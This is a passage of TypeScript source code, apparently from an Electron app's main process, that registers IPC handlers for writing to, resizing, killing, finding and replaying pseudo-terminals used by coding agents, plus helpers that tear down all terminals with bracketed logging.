        // have already removed this entry, which made arithmetic here wrong.
        log.info("pty.exited", {
          event: "pty.exited",
          ptyId: id,
          exitCode,
          signal,
          live: ptys.size,
        });
      });

      return { ptyId: id };
    },
    ipcMain,
  );

  safeHandle(IPC.ptyWrite, (_evt, { ptyId, data }: { ptyId: string; data: string }) => {
    const p = ptys.get(ptyId);
    if (!p) return false;
    p.lastInputAt = Date.now();
    recordPtyInput(ptyId);
    p.proc.write(data);
    return true;
  }, ipcMain);

  safeHandle(
    IPC.ptyResize,
    (_evt, { ptyId, cols, rows }: { ptyId: string; cols: number; rows: number }) => {
      const p = ptys.get(ptyId);
      if (!p) return false;
      try {
        p.proc.resize(cols, rows);
      } catch {
        /* swallow */
      }
      return true;
    },
    ipcMain,
  );

  safeHandle(IPC.ptyKill, (_evt, { ptyId }: { ptyId: string }) => {
    const p = ptys.get(ptyId);
    if (!p) return false;
    disposePty(p.proc);
    ptys.delete(ptyId);
    untrackPty(ptyId);
    return true;
  }, ipcMain);

  safeHandle(
    IPC.ptyKillUnderPath,
    async (_evt, { cwd }: { cwd: string }): Promise<{ ptyCount: number }> => {
      const ptyCount = await killPtysUnderPath(cwd);
      return { ptyCount };
    },
    ipcMain,
  );

  // Live agent PTY for a task, if any. Local pty ids are not persisted across
  // renderer reloads, but the processes themselves survive in this map — the
  // renderer asks here before spawning so a reload reattaches to the running
  // agent instead of launching a duplicate (which dies with "session ID is
  // already in use" for agents that pin a session id).
  safeHandle(IPC.ptyFindByTask, (_evt, { taskId }: { taskId: string }) => {
    if (typeof taskId !== "string" || !taskId) return { ptyId: null };
    let found: string | null = null;
    for (const p of ptys.values()) {
      if (p.taskId === taskId && !p.shell) found = p.id;
    }
    return { ptyId: found };
  }, ipcMain);

  safeHandle(IPC.ptyReplay, (_evt, { ptyId }: { ptyId: string }) => {
    const p = ptys.get(ptyId);
    if (!p) return { data: "", nextSeq: 0 };
    // Deliver pending output as a pre-snapshot message first, so no later
    // batch ever mixes chunks from both sides of this snapshot (see the
    // invariant note in pty-output-batch.ts).
    outputBatcher.flush(ptyId);
    return {
      data: p.buffer.map((chunk) => chunk.data).join(""),
      nextSeq: p.nextSeq,
    };
  }, ipcMain);
}

/**
 * Tear down a set of PTYs under a single bracketed log pair.
 *
 * App shutdown and closing a project both tear every PTY down back-to-back,
 * which is the densest concentration of the teardown abort disposePty()
 * describes. One pair brackets the whole sweep and carries the count, so a log
 * that stops mid-sweep still shows how far it got — while the per-PTY pairs
 * stay silenced, because each log call is a synchronous open-write-close and an
 * unbatched loop over every live PTY would turn closing a busy project into a
 * burst of file writes in one event-loop turn, on exactly the path that is
 * already the most crash-prone.
 */
export function disposeAllPtys(
  procs: readonly (import("node-pty").IPty | null | undefined)[],
): void {
  const live = procs.length;
  log.info("pty.killAll.begin", { event: "pty.killAll.begin", live });
  for (const proc of procs) {
    disposePty(proc, { silent: true });
  }
  log.info("pty.killAll.end", { event: "pty.killAll.end", live });
}

/**
 * Live local PTY ids.
 *
 * The silence sweep enumerates from here rather than from the tracker, so a
 * missed teardown in the tracker cannot turn a stale entry into a phantom
 * session. This map is the lifecycle authority; the tracker is a side table.
 */
export function liveLocalPtyIds(): string[] {
  return [...ptys.keys()];
}

export function killAllPtys() {
  // Anything still parked on the permission gate would otherwise resume after
  // this sweep and spawn a PTY nothing is left to kill.
  cancelAllPendingSpawns();
  disposeAllPtys([...ptys.values()].map((p) => p.proc));
  for (const id of ptys.keys()) untrackPty(id);
  ptys.clear();
}
